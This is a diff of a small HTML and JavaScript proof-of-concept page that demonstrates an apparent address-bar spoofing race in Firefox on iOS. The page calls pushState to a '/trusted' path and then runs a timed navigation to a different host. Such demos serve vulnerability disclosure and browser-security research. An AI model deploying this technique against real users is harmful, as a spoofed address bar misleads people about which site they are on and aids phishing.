@@ -1,10 +1,9 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Navigation / Origin Race PoC</title>
+<title>Firefox iOS Navigation Race PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
 <style>
 body {
   margin: 0;
@@ -43,7 +42,6 @@ iframe {
 }
 </style>
 </head>
-
 <body>
 
 <div style="text-align:center; margin-top:60px;">
@@ -51,8 +49,8 @@ iframe {
 </div>
 
 <div id="panel">
-  <h2>UI / Navigation Race Demo</h2>
-  <p>Observe address bar, iframe, and navigation timing.</p>
+  <h2>Firefox iOS Navigation Race</h2>
+  <p>Click the button, observe address bar & iframe behavior.</p>
 
   <button id="actionBtn">Trigger Action</button>
   <p id="output">Status: idle</p>
@@ -65,7 +63,7 @@ iframe {
   </iframe>
 
   <div class="notice">
-    Demo only — observe UI / origin behavior
+    Demo only — Firefox iOS affected, Safari/Chrome iOS not affected.
   </div>
 </div>
 
@@ -73,33 +71,29 @@ iframe {
 const panel   = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
 const output  = document.getElementById('output');
-const iframe  = document.getElementById('childFrame');
 
 /* Dummy action */
 function triggerAction() {
-  output.textContent =
-    "Action executed @ " + location.href;
+  output.textContent = "Action executed @ " + location.href;
 }
 
-/* Step 1: URL manipulation */
+/* Step 1: Show panel & manipulate URL */
 trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-
+  history.pushState({}, '', '/trusted'); // Omnibar change
   panel.style.display = 'block';
   output.textContent = "pushState → " + location.href;
 };
 
-document
-  .getElementById('actionBtn')
-  .onclick = triggerAction;
+/* Bind action button */
+document.getElementById('actionBtn').onclick = triggerAction;
 
-/* Step 2: Navigation race */
+/* Step 2: Navigation race to show omnibar bug */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
+        location.href = 'https://google.com:9090'; // Race target
+      }, 80); // milliseconds
     });
   });
 });
